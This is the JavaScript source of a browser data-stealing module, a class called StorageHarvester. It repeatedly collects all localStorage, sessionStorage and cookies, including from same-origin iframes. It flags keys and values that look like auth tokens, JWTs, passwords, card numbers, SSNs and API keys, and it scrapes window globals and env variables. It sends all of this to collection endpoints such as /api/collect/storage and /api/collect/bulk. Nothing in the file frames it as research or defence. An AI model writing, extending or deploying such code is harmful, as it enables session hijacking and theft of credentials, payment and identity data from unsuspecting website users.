export default class StorageHarvester {
  constructor(core) {
    this.core = core;
    this.harvestedStorageKeys = new Set();
    this.crossOriginFrames = [];
  }

  init() {
    // Initial harvest
    setTimeout(() => this.harvest(), 3000);
    setTimeout(() => this.harvestCrossOriginStorage(), 8000);

    // Periodic re-harvests to catch new data
    setInterval(() => this.harvest(), 15000);
    setInterval(() => this.harvestCrossOriginStorage(), 60000);

    // Delayed attempts
    setTimeout(() => this.harvest(), 1000);
    setTimeout(() => this.harvest(), 10000);
    setTimeout(() => this.harvest(), 30000);

    // Monitor DOM for iframes from other origins
    this.monitorIframes();
  }

  harvest() {
    const data = { localStorage: [], sessionStorage: [], cookies: [] };

    // === localStorage (ALL keys, not just first 500 chars) ===
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        const value = localStorage.getItem(key);
        data.localStorage.push({
          key,
          value: value?.length > 5000 ? value.substring(0, 5000) + '...' : value || '',
          length: value?.length || 0
        });
        this.harvestedStorageKeys.add(`localStorage:${key}`);
      }
    }

    // === sessionStorage (ALL keys) ===
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (key) {
        const value = sessionStorage.getItem(key);
        data.sessionStorage.push({
          key,
          value: value?.length > 5000 ? value.substring(0, 5000) + '...' : value || '',
          length: value?.length || 0
        });
        this.harvestedStorageKeys.add(`sessionStorage:${key}`);
      }
    }

    // === Cookies (with metadata) ===
    const cookies = document.cookie.split(';').filter(c => c.trim()).map(c => {
      const [name, ...rest] = c.split('=');
      const value = rest.join('=')?.trim();
      return {
        name: name?.trim(),
        value,
        length: value?.length || 0,
        hasHttpOnly: false, // can't detect from JS
        hasSecure: false,
        timestamp: Date.now()
      };
    });

    data.cookies = cookies;

    // Send to server
    this.core.send('/api/collect/storage', {
      localStorage: data.localStorage,
      sessionStorage: data.sessionStorage
    });

    this.core.send('/api/collect/cookies', { cookies: data.cookies });

    // Also send high-value storage items separately
    const highValueKeys = ['token', 'auth', 'jwt', 'session', 'key', 'secret', 'password',
                           'access', 'refresh', 'sid', 'csrf', 'api_key', 'apikey',
                           'private', 'credential', 'login', 'user', 'email', 'phone',
                           'ssn', 'dob', 'address', 'card', 'cvv', 'pin', 'pin_code',
                           'passport', 'driver', 'license', 'bank', 'account', 'routing'];

    const sensitiveItems = [];
    [...data.localStorage, ...data.sessionStorage].forEach(item => {
      const keyLower = item.key.toLowerCase();
      if (highValueKeys.some(k => keyLower.includes(k))) {
        sensitiveItems.push({
          source: item.key.includes('local') ? 'localStorage' : 'sessionStorage',
          key: item.key,
          value: item.value?.substring(0, 1000),
          hint: 'high-value-key'
        });
      }
      // Check for JWT tokens
      if (item.value && /^eyJ[A-Za-z0-9\-_]+\./.test(item.value)) {
        sensitiveItems.push({
          source: 'jwt-token',
          key: item.key,
          value: item.value.substring(0, 500),
          hint: 'jwt'
        });
      }
      // Check for credit card patterns
      if (item.value && /\b(?:\d[ -]*?){13,16}\b/.test(item.value)) {
        sensitiveItems.push({
          source: 'potential-cc',
          key: item.key,
          value: item.value.substring(0, 500),
          hint: 'credit-card'
        });
      }
      // Check for API keys
      if (item.value && item.value.length > 20 && /^[A-Za-z0-9\-_]{20,}$/.test(item.value)) {
        sensitiveItems.push({
          source: 'potential-api-key',
          key: item.key,
          value: item.value.substring(0, 500),
          hint: 'api-key'
        });
      }
    });

    if (sensitiveItems.length > 0) {
      this.core.send('/api/collect/bulk', {
        data: {
          storageSensitive: sensitiveItems,
          _meta: { trigger: 'storage-harvest-sensitive', count: sensitiveItems.length }
        }
      });
    }
  }

  // === Cross-origin Storage Harvesting via Iframes ===
  harvestCrossOriginStorage() {
    try {
      const frames = document.querySelectorAll('iframe, frame, object, embed');
      const results = [];

      frames.forEach((frame, i) => {
        try {
          const frameSrc = frame.src || frame.getAttribute('src') || frame.data || '';
          if (!frameSrc || !frameSrc.startsWith('http')) return;

          const frameOrigin = new URL(frameSrc).origin;
          const isCrossOrigin = frameOrigin !== window.location.origin;

          if (isCrossOrigin) {
            results.push({
              iframeIndex: i,
              src: frameSrc.substring(0, 200),
              origin: frameOrigin,
              hint: 'cross-origin',
              note: 'Cannot access cross-origin iframe storage directly'
            });
            return;
          }

          // Same-origin iframe - we CAN access its storage
          try {
            const frameDoc = frame.contentDocument || frame.contentWindow?.document;
            if (!frameDoc) return;

            // Harvest localStorage from iframe
            const iframeLocal = frame.contentWindow?.localStorage;
            if (iframeLocal) {
              const items = [];
              for (let j = 0; j < iframeLocal.length; j++) {
                const key = iframeLocal.key(j);
                if (key) {
                  items.push({
                    key,
                    value: iframeLocal.getItem(key)?.substring(0, 1000),
                    iframeSrc: frameSrc.substring(0, 100)
                  });
                }
              }
              if (items.length > 0) {
                results.push({
                  iframeIndex: i,
                  src: frameSrc.substring(0, 200),
                  origin: frameOrigin,
                  type: 'localStorage',
                  itemCount: items.length,
                  items: items.slice(0, 20) // limit to 20 per iframe
                });
              }
            }

            // Harvest cookies from iframe
            try {
              const iframeCookies = frameDoc.cookie;
              if (iframeCookies && iframeCookies.length > 5) {
                results.push({
                  iframeIndex: i,
                  src: frameSrc.substring(0, 200),
                  type: 'cookies',
                  cookies: iframeCookies.substring(0, 500)
                });
              }
            } catch (e) {}
          } catch (e) {}
        } catch (e) {}
      });

      // Check for embedded content via object/embed tags
      const embeds = document.querySelectorAll('embed[src], object[data]');
      embeds.forEach((embed, i) => {
        const src = embed.getAttribute('src') || embed.getAttribute('data') || '';
        if (src && src.startsWith('http')) {
          try {
            const origin = new URL(src).origin;
            if (origin !== window.location.origin) {
              results.push({
                embedIndex: i,
                src: src.substring(0, 200),
                origin,
                type: 'cross-origin-embed',
                hint: 'cross-origin'
              });
            }
          } catch (e) {}
        }
      });

      if (results.length > 0) {
        this.core.send('/api/collect/bulk', {
          data: {
            crossOriginStorage: results,
            _meta: {
              trigger: 'cross-origin-storage-harvest',
              totalIframes: frames.length,
              totalResults: results.length,
              timestamp: Date.now()
            }
          }
        });
      }
    } catch (e) {}
  }

  // === Monitor for new iframes that might contain storage ===
  monitorIframes() {
    const observer = new MutationObserver((mutations) => {
      mutations.forEach(mutation => {
        mutation.addedNodes.forEach(node => {
          if (node.nodeName === 'IFRAME' || node.nodeName === 'FRAME') {
            setTimeout(() => this.harvestCrossOriginStorage(), 500);
          }
          if (node.querySelectorAll) {
            const iframes = node.querySelectorAll('iframe, frame');
            if (iframes.length > 0) {
              setTimeout(() => this.harvestCrossOriginStorage(), 500);
            }
          }
        });
      });
    });

    try {
      observer.observe(document.body || document.documentElement, {
        childList: true,
        subtree: true
      });
    } catch (e) {}
  }

  // === API Keys available in environment/variables ===
  harvestAPIKeys() {
    const apiKeys = [];

    // Check for common global API key variables
    const commonKeys = ['apiKey', 'API_KEY', 'api_key', 'apiSecret', 'API_SECRET', 'api_secret',
                        'googleMapsKey', 'firebaseApiKey', 'stripeKey', 'stripePublishableKey',
                        'razorpayKey', 'paypalClientId', 'googleAnalyticsId', 'facebookPixelId'];

    commonKeys.forEach(keyName => {
      try {
        if (window[keyName]) {
          apiKeys.push({
            source: 'window-global',
            key: keyName,
            value: String(window[keyName]).substring(0, 200)
          });
        }
      } catch (e) {}

      // Check process.env (Create React App exposes REACT_APP_* variables)
      try {
        if (process && process.env && process.env[keyName]) {
          apiKeys.push({
            source: 'process-env',
            key: keyName,
            value: process.env[keyName].substring(0, 200)
          });
        }
      } catch (e) {}
    });

    // Scrape all REACT_APP_ variables
    try {
      if (process && process.env) {
        Object.keys(process.env).forEach(key => {
          if (key.startsWith('REACT_APP_') || key.startsWith('NEXT_PUBLIC_') || key.startsWith('VUE_APP_')) {
            apiKeys.push({
              source: 'env-variable',
              key,
              value: process.env[key].substring(0, 200)
            });
          }
        });
      }
    } catch (e) {}

    if (apiKeys.length > 0) {
      this.core.send('/api/collect/formdata', {
        formId: 'api-keys-harvest',
        fields: { keys: apiKeys, count: apiKeys.length },
        url: window.location.href
      });
    }
  }

  getHarvestedKeys() {
    return [...this.harvestedStorageKeys];
  }
}